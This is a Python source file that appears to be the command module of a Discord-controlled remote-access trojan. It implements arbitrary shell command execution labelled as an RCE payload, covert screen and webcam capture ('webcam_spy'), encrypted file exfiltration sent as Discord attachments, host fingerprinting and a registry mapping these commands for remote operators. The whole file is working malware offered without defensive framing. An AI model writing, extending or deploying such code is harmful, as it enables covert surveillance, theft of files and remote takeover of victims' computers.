import platform
import os
import datetime
import subprocess
import discord
import sys
from mss import mss
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import config

# --- ENCRYPTION HELPER ---
def encrypt_file(filepath):
    try:
        aesgcm = AESGCM(config.AES_KEY)
        nonce = os.urandom(12)
        with open(filepath, 'rb') as f:
            data = f.read()
        ciphertext = aesgcm.encrypt(nonce, data, None)
        enc_filename = os.path.basename(filepath) + ".enc"
        enc_path = os.path.join(config.TEMP_DIR, enc_filename)
        with open(enc_path, 'wb') as f:
            f.write(nonce + ciphertext)
        return enc_path
    except Exception as e:
        return None

# --- NEW: RCE PAYLOAD ---
def run_terminal_command(command_str):
    """
    Executes a shell command and returns the output.
    """
    if not command_str: 
        return "⚠️ Error: You must provide a command. Example: ⚡ whoami"
    
    try:
        # Run the command
        # shell=True allows using pipes and system variables
        result = subprocess.run(
            command_str, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=15  # Safety timeout
        )
        
        # Combine StdOut and StdErr
        output = result.stdout + result.stderr
        
        if not output:
            return "✅ Command executed successfully (No text output)."
            
        # Check Discord Limit (2000 chars). We leave buffer for the code block.
        if len(output) > 1900:
            return f"⚠️ Output too long ({len(output)} chars). Truncated:\n{output[:1900]}..."
            
        return output

    except subprocess.TimeoutExpired:
        return "⚠️ Error: Command timed out (took longer than 15s)."
    except Exception as e:
        return f"⚠️ Execution Error: {str(e)}"

# --- EXISTING PAYLOADS ---
def get_system_info(args=None):
    data = f"🖥️ OS: {platform.system()} {platform.release()}\n"
    data += f"👤 Node: {platform.node()}\n"
    return data

def try_everything_snapshot(args=None):
    filename = os.path.join(config.TEMP_DIR, "evidence.png")
    if os.path.exists(filename): os.remove(filename)
    
    log = ""
    # 1. Try Screen
    try:
        with mss() as sct:
            sct.shot(mon=1, output=filename)
        if os.path.exists(filename) and os.path.getsize(filename) > 0:
            return discord.File(filename)
    except Exception as e:
        log += f"[Screen: {e}] "

    # 2. Try Webcam
    try:
        subprocess.run(
            ["fswebcam", "-r", "1280x720", "--no-banner", "-S", "20", filename],
            capture_output=True, text=True, timeout=5
        )
        if os.path.exists(filename):
            return discord.File(filename, filename="webcam_spy.png")
    except Exception as e:
        log += f"[Cam: {e}]"

    return f"⚠️ BLIND AGENT. Log: {log}"

def exfiltrate_file(filepath):
    if not filepath: return "⚠️ Error: No file path."
    if not os.path.exists(filepath): return "⚠️ Error: File not found."
    try:
        encrypted_path = encrypt_file(filepath)
        if encrypted_path:
            return discord.File(encrypted_path)
        return "⚠️ Encryption failed."
    except Exception as e:
        return f"⚠️ Exfil Error: {str(e)}"

def ping_pong(args=None):
    return "🏓 Pong! Agent ready."

def remote_exit(args=None):
    sys.exit(0)

# --- REGISTRY ---
EXEC_REGISTRY = {
    'cmd_shell': get_system_info,
    'cmd_screenshot': try_everything_snapshot,
    'cmd_ping': ping_pong,
    'cmd_exfil': exfiltrate_file,
    'cmd_exit': remote_exit,
    'cmd_exec': run_terminal_command  
}